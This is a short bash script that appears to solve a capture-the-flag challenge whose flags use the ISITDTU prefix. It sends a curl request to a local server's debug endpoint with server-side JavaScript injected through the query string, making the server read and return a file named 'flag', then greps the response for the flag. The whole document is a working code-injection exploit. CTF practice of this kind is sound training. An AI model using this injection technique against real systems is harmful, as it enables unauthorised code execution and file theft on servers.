#!/bin/bash

curl -s "http://localhost:1337/debug?debug=res.sendFile(path.resolve(%27flag%27))" | grep -o ISITDTU{.*}
